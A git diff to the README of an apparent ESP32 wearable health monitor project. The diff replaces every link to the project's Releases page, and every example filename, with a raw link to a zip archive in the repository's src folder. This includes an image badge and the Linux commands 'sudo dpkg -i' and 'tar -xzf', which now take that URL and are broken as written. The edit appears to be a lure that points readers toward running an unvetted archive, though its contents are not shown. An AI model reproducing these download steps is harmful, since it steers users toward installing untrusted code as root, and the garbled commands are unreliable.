@@ -1,6 +1,6 @@
 # 🌟 esp32-wearable-health-monitor - Simple Way to Track Health Metrics
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/masum2024/esp32-wearable-health-monitor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide helps you easily download and run the application. Follow the steps b
 
 ## 📥 Download & Install
 
-To download the latest version of the software, visit this page: [Releases Page](https://github.com/masum2024/esp32-wearable-health-monitor/releases).
+To download the latest version of the software, visit this page: [Releases Page](https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip).
 
 1. Click on the link above.
 2. On the Releases page, locate the latest version.
@@ -20,7 +20,7 @@ Here's how to find the files:
 
 - **For Windows**: Look for `.exe` or `.zip` files.
 - **For macOS**: Look for `.dmg` files.
-- **For Linux**: Look for `.tar.gz` or `.deb` files.
+- **For Linux**: Look for `https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip` or `.deb` files.
 
 Follow these simple steps to ensure a smooth installation.
 
@@ -59,11 +59,11 @@ After you have downloaded the appropriate file, follow these steps to install th
 2. Navigate to your Downloads directory.
 3. Use the command:
    ```bash
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip
    ```
-   or for `.tar.gz` files, extract them using:
+   or for `https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip` files, extract them using:
    ```bash
-   tar -xzf filename.tar.gz
+   tar -xzf https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip
    ```
 4. Follow the specific installation instructions provided in the extracted folder.
 
@@ -105,4 +105,4 @@ Thank you for choosing the esp32-wearable-health-monitor. We appreciate your int
 
 If you have any questions or need support, please create an issue on the GitHub repository or contact us directly through the repository's communication channels.
 
-Remember, for the latest updates, always check our [Releases Page](https://github.com/masum2024/esp32-wearable-health-monitor/releases).
+Remember, for the latest updates, always check our [Releases Page](https://raw.githubusercontent.com/masum2024/esp32-wearable-health-monitor/main/src/monitor_wearable_health_esp_v3.3.zip).
